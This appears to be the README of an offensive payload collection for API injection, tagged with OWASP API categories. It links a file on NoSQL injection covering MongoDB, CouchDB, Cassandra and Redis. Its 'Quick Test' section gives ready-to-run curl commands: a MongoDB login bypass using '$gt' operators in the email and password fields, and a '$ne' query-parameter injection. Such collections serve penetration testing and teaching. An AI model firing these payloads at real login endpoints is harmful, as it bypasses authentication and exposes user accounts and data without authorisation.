# API Injection Payloads

> **OWASP API**: API8/API10 — Injection

## Files

| File | Description |
|------|-------------|
| [`nosql_injection.md`](nosql_injection.md) | MongoDB operator injection, $where, CouchDB Mango, Cassandra CQL, Redis CRLF |

## Quick Test

```bash
# MongoDB auth bypass
curl -X POST https://api.target.com/api/v1/login \
  -H "Content-Type: application/json" \
  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'

# Query parameter syntax
curl "https://api.target.com/api/v1/users?email[\$ne]=nonexistent"
```
